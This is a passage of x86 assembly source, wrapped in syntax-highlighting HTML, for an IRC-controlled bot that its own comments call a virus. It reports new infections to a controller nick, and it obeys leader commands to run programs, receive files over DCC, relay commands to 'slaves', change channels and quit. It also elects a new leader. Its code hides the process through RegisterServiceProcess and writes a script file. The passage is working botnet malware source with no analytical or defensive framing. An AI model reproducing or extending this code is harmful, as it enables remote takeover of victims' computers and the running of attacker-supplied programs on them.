</span><span class="sc5">JoinChannel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 #"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; look for a #</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2#"</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; split string at #</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ParseChannel</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">ParseChannel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$3 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; split string at space</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JoinNewChannel</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">JoinNewChannel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"JOIN #$3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">



</span><span class="sc5">NewVirusOnline</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">                     </span><span class="sc1">; if so, Send string</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 $recv :Hello child"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; $0 = PRIVMSG</span><span class="sc0">
                                                </span><span class="sc1">; $recv = Channel or Person</span><span class="sc0">
                                                </span><span class="sc1">; Hello child = Message to</span><span class="sc0">
                                                </span><span class="sc1">; send</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 Bhunji :New infection"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">NickIsBhunji</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :DCC "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">AtDCCSend</span><span class="sc0">


                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :restart"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ConnectFunction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :god"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 Bhunji :$god"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 Bhunji :$leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :nick "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ChangeNickFunction</span><span class="sc0">


                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :cd "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SetPath</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :dir "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">CallDirFunction</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">NoScan</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"l"</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">LeaderMessages</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">SetPath</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$path $3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">CallDirFunction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">DirFunction</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">;------------------------- Messages from one of the slaves</span><span class="sc0">
</span><span class="sc5">SlaveMessages</span><span class="sc4">:</span><span class="sc0">             
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :DCC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">AtDCCSend</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">


</span><span class="sc5">SendScript</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$3 script.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AtDCCSend</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">DCCSendFunction</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">        

</span><span class="sc1">; ------------------------------- Messages from the leader</span><span class="sc0">
</span><span class="sc5">LeaderMessages</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :recursive "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">                     
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 $slaves $2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       
                                                
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :join "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">EnterChannelFunction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :leave "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">LeaveChannelFunction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :msg"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MessageFunction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :slaves"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 $recv :$slaves"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :run "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RunProgram</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :Hello child"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 $recv :Do you have place for me?"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :quit!!"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; ***</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">QuitFunction</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 "</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc3">"DCC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; leader sends a file</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; $3 = send or chat</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DCCRecvProc</span><span class="sc0">             </span><span class="sc1">; $4 = additional data</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :SEND:"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">CheckIfGotProgram</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :No, ask "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$2 "</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">NewLeader</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">RunProgram</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ExecuteProgram</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">CheckIfGotProgram</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ShouldRecieveProgram</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">


                </span><span class="sc1">; Change leader and restart</span><span class="sc0">
</span><span class="sc5">NewLeader</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$leader $4"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">StartCommands</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">



</span><span class="sc5">LeaveChannelFunction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PART $3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">ChangeNickFunction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NICK $3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">EnterChannelFunction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"JOIN $3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">MessageFunction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $3 :$4"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">


</span><span class="sc1">; -------------------------------------------- DCC Handler</span><span class="sc0">
  </span><span class="sc5">DCCRecvProc</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"$3 SEND"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"f"</span><span class="sc0">
                        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">DCCRecvFunction</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">EndOfList</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"$4 CHAT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DCCChatFunction</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; ------------------------------------ If leader is online</span><span class="sc0">
  </span><span class="sc5">IsOnMessage</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc1">; if leader isnt online, change name to leader</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Restart</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $slave1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$slave1 "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $slave2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$slave2 "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $slave3"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$slave3 "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $slave4"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$slave4 "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$1 $slave5"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$slave5 "</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

  </span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">                      

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NICK $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc1">; new leader is god</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$leader $god"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc1">; restart virus</span><span class="sc0">

</span><span class="sc1">; ----------------------- Commands to send when registered</span><span class="sc0">

  </span><span class="sc5">StartCommands</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; Check if leader is online</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ISON $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG $leader :Hello master"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; Dont change anything below</span><span class="sc0">

</span><span class="sc1">; Messages not beginning with ':'</span><span class="sc0">

</span><span class="sc5">ListOfDownloadedFiles</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">EndOfScript</span><span class="sc4">:</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
        </span><span class="sc5">ScriptFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"script.dat"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">BotFileName</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"dllmgr.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">Kernel32</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"kernel32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegisterService</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegisterServiceProcess"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HideProgram</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleHandleA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetProcAddress</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegisterService</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoHide</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">NoHide</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">MyOpenFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


    </span><span class="sc5">Main</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HideProgram</span><span class="sc0">

    </span><span class="sc5">WaitUntilBotIsDead</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BotFileName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">OPEN_ALWAYS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WaitUntilBotIsDead</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ScriptFileName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc10">Error</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        
